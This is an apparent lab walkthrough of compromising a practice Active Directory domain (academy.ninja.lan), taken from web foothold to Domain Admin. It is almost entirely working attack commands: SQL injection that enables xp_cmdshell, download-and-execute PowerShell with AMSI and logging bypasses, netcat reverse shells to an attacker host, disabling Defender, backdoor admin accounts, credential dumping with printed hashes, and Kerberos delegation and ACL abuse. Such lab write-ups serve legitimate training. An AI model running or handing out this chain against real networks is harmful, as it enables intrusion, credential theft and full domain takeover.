# NHA

Starting point : 192.168.58.21

Scan network

```bash
crackmapexec smb 192.168.58.0/24
```

<figure><img src="../.gitbook/assets/Pasted image 20240228144910.png" alt=""><figcaption></figcaption></figure>

Add to /etc/hosts to name resolve

### **192.168.58.22 - Foothold from web.academy.ninja.lan**

Launch a portscan with rustscan

```bash
rustscan -a 192.168.58.21 -- -sV -sC -Pn
```

<figure><img src="../.gitbook/assets/Pasted image 20240228145557.png" alt=""><figcaption></figcaption></figure>

Found a list of user and a possible username format

<figure><img src="../.gitbook/assets/Pasted image 20240228150915.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/Pasted image 20240228150925.png" alt=""><figcaption></figcaption></figure>

Save them in a file

http://web.academy.ninja.lan/students?SearchString=er\&orderBy=Firstname Is vulnerable to SQLi, test with

```mssql
;waitfor delay '0:0:10' --
```

works, so active xp\_cmdshell

```mssql
;EXEC sp_configure 'show advanced options',1; --
;RECONFIGURE; --
;EXEC sp_configure 'xp_cmdshell',1; --
;RECONFIGURE; --
```

Open a python server localy to test if works

```mssql
;EXEC master.dbo.xp_cmdshell 'curl 192.168.58.100'; --
```

<figure><img src="../.gitbook/assets/Pasted image 20240301171852.png" alt=""><figcaption></figcaption></figure>

And with the following command i can get a reverse shell from .22(mssql server)

{% code overflow="wrap" %}
```mssql
;EXEC master.dbo.xp_cmdshell 'powershell -c "iex (iwr -UseBasicParsing http://192.168.58.100/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.58.100/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.58.100/Invoke-PowerShellTcpEx.ps1)"'; --
```
{% endcode %}

<figure><img src="../.gitbook/assets/Pasted image 20240306145245.png" alt=""><figcaption></figcaption></figure>

### **From MsSQL server to Web.Academy.Ninja.Lan**

_From service to System_ Create a obfuscated version of printspoofer64 and download it

```powershell
curl -o printspoofer64.exe http://192.168.58.100/PrintSpoofer64.exe
```

now upload netcat also and use it to open a reverse shell as system

{% code overflow="wrap" %}
```powershell
./printspoofer64.exe -i -c powershell.exe -c "C:\Users\Public\nc64.exe 192.168.58.100 4422 -e powershell.exe"
```
{% endcode %}

<figure><img src="../.gitbook/assets/Pasted image 20240313145143.png" alt=""><figcaption></figcaption></figure>

### &#x20;_System to Web.Academy.Ninja.Lan_&#x20;

First disable Windows Defender

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
```

Create a new administrator user

{% code overflow="wrap" %}
```powershell
New-LocalUser -Name "hacker" -Password (ConvertTo-SecureString "hacker" -AsPlainText -Force)
```
{% endcode %}

<figure><img src="../.gitbook/assets/Pasted image 20240313153037.png" alt=""><figcaption></figcaption></figure>

&#x20;and use them to get a more stable shell with evil-winrm

```bash
evil-winrm -i 192.168.58.22 -u hacker -p hacker
```

Now upload SharpHound.exe and use it to gain information about the domain

{% code overflow="wrap" %}
```powershell
./SharpHound.exe --collectionmethods All --outputdirectory C:\Users\Public --zipfilename loot.zip
```
{% endcode %}

<figure><img src="../.gitbook/assets/Pasted image 20240315100026.png" alt=""><figcaption></figcaption></figure>

The path to our netx target is pretty clear

&#x20;Upload SafetyKatz on the machine and use it to dump the SQL$ hash

<mark style="color:yellow;">SQL$ lm:nt = aad3b435b51404eeaad3b435b51404ee:bc97a8db7f565a18bbb3b2b4eaefb95a</mark>

and use it to modify the dacl on computers OU (All sub object will inherite the dacl)

{% code overflow="wrap" %}
```bash
./dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'SQL$' -target-dn 'CN=COMPUTERS,DC=ACADEMY,DC=NINJA,DC=LAN' -hashes 'aad3b435b51404eeaad3b435b51404ee:bc97a8db7f565a18bbb3b2b4eaefb95a' -dc-ip 192.168.58.20 academy/SQL$
```
{% endcode %}

<figure><img src="../.gitbook/assets/Pasted image 20240315151638.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/Pasted image 20240315151835.png" alt=""><figcaption></figcaption></figure>

&#x20;Now with the generic all permission i can shell on the machine thanks to the

using impacket i can create a new machine to abuse that functionatility and assign it the delegation

{% code overflow="wrap" %}
```
impacket-rbcd -delegate-from 'sql$' -delegate-to 'web$' -dc-ip '192.168.58.20' -action 'write' 'academy/sql$' -hashes 'aad3b435b51404eeaad3b435b51404ee:bc97a8db7f565a18bbb3b2b4eaefb95a'
```
{% endcode %}

<figure><img src="../.gitbook/assets/Pasted image 20240315162047.png" alt=""><figcaption></figcaption></figure>

and on sql request and import a TGT to access web

{% code overflow="wrap" %}
```powershell
./rubeus.exe s4u /user:sql$ /aes256:97cca7c99f8b4ab7f11e0d5227e628e504b41f2376aba073b920531e830a58f1 /impersonateuser:Administrator /msdsspn:wsman/web /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /ptt
```
{% endcode %}

<figure><img src="../.gitbook/assets/Pasted image 20240321113451.png" alt=""><figcaption></figcaption></figure>

Now i can access to web with the command

```powershell
winrs -r:web cmd
```

and add a new administrator user to the machine to get a nice shell

{% code overflow="wrap" %}
```powershell
New-LocalUser -Name "hacker" -Password (ConvertTo-SecureString "hacker" -AsPlainText -Force)
```
{% endcode %}

And now i can access with the command

```bash
evil-winrm -i 192.168.58.21 -u "web\hacker" -p hacker
```

### **From web to share**

_web to frank_ First disable the antivirus

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
```

Upload SafetyKatz on the machine and dump all thw hashes

```powershell
./SafetyKatz.exe token::elevate sekurlsa::ekeys exit
```

<figure><img src="../.gitbook/assets/Pasted image 20240321120726.png" alt=""><figcaption></figcaption></figure>

&#x20;as we can see we obtained the frank's hashes.&#x20;

<mark style="color:yellow;">frank aes256 hash = a0d676dd3e4d7673ec255caf010e1e350f1b09d8871b88eb01c4c8ba4217beac</mark>

### &#x20;_frank to share_&#x20;

By looking in bloodhound we can also see that frank can delegate to share.academy.ninja.lan&#x20;

<figure><img src="../.gitbook/assets/Pasted image 20240321121344.png" alt=""><figcaption></figcaption></figure>

Upload Rubeus and nc64.exe. You need to be system to abuse the constrained delegation, so create a new task that launch as system to get a reverse shell as it

{% code overflow="wrap" %}
```powershell
schtasks /create /S web /SC Weekly /RU "NT Authority\SYSTEM" /TN "hacker" /TR "powershell.exe -c 'C:\Users\Public\nc64.exe 192.168.58.100 4422 -e powershell.exe'"
```
{% endcode %}

and launch it with a listener open

```powershell
schtasks /Run /S web.academy.ninja.lan /TN "hacker"
```

Now use rubeus to forge the tickets and get a shell on share

{% code overflow="wrap" %}
```powershell
.\Rubeus.exe s4u /user:frank /aes256:a0d676dd3e4d7673ec255caf010e1e350f1b09d8871b88eb01c4c8ba4217beac /impersonateuser:Administrator /msdsspn:"eventlog/share" /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /ptt
```
{% endcode %}

<figure><img src="../.gitbook/assets/Pasted image 20240325112059.png" alt=""><figcaption></figcaption></figure>

we have now access to share.academy.ninja.lan

### **From Share to Domain Admin**

_From Share to GMSANFS$_ First disable antivirus

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
```

And then create a new administrator user to get a more stable shell

```powershell
New-LocalUser -Name "hacker" -Password (ConvertTo-SecureString "hacker" -AsPlainText -Force)
```

```powershell
net localgroup Administrators /add hacker
```

And now i can access with the command

```bash
evil-winrm -i 192.168.58.23 -u "share\hacker" -p hacker
```

<figure><img src="../.gitbook/assets/Pasted image 20240325112521.png" alt=""><figcaption></figcaption></figure>

From bloodhound we can see that Share$ has the permission to read the GMSA password for the group managed account "GMSANFS$". Upload GMSAPasswordReader.exe. Once again we need a system shell to abuse this acl so we can use the same previous trick

{% code overflow="wrap" %}
```powershell
schtasks /create /S share /SC Weekly /RU "NT Authority\SYSTEM" /TN "hacker" /TR "powershell.exe -c 'C:\Users\Public\nc64.exe 192.168.58.100 4422 -e powershell.exe'"
```
{% endcode %}

and launch it with a listener open

```powershell
schtasks /Run /S share.academy.ninja.lan /TN "hacker"
```

and read the gmsanfs$ hash

```powershell
./GMSAPasswordReader.exe --accountname "GMSANFS$"
```

<figure><img src="../.gitbook/assets/Pasted image 20240325115433.png" alt=""><figcaption></figcaption></figure>

<mark style="color:yellow;">GMSANFS$ aes : 9AF6A6D71C4EB5AD3D0A3ED856969098529E51D9B2132DBE83A60739CD43188E NT:6B527205AB8EC838D0D1B317EC51EBEB</mark>

_From GMSANFS$ to Backup account_ GMSAFS$ has th permission "ForceChangePassword" on the account backup From the local machine

{% code overflow="wrap" %}
```bash
pth-net rpc password backup -U academy.ninja.lan/gmsaNFS$%ffffffffffffffffffffffffffffffff:6B527205AB8EC838D0D1B317EC51EBEB -S dc-ac.academy.ninja.lan
```
{% endcode %}

_From backup to domain admin_ Now from bloodhound we can see that backup has the "WriteOwner" permission on the domain admin group. So to fully control this group we can transfer the ownership on backup itself with impacket-ownredit https://github.com/fortra/impacket/pull/1323

{% code overflow="wrap" %}
```bash
python3 owneredit.py -action write -new-owner 'backup' -target-sid 'S-1-5-21-1699050531-2152117061-1142517440-512' academy.ninja.lan/backup:hacker -dc-ip 192.168.58.20
```
{% endcode %}

<figure><img src="../.gitbook/assets/Pasted image 20240325124656.png" alt=""><figcaption></figcaption></figure>

With dacledit we can grant to backup the permission to add member to the group Domain Admins

{% code overflow="wrap" %}
```bash
python3 dacledit.py -action 'write' -rights 'WriteMembers' -principal 'backup' -target-dn 'CN=DOMAIN ADMINS,CN=USERS,DC=ACADEMY,DC=NINJA,DC=LAN' academy.ninja.lan/backup:hacker -dc-ip 192.168.58.20
```
{% endcode %}

<figure><img src="../.gitbook/assets/Pasted image 20240325125653.png" alt=""><figcaption></figcaption></figure>

and add it

{% code overflow="wrap" %}
```bash
net rpc group addmem "Domain Admins" "backup" -U academy.ninja.lan/backup%hacker -S "dc-ac.academy.ninja.lan"
```
{% endcode %}

we can now log in in the dc with the backup credentials

```bash
impacket-wmiexec  academy.ninja.lan/backup:hacker@192.168.58.20 -dc-ip 192.168.58.20
```

<figure><img src="../.gitbook/assets/Pasted image 20240325130005.png" alt=""><figcaption></figcaption></figure>

#### **tbc**
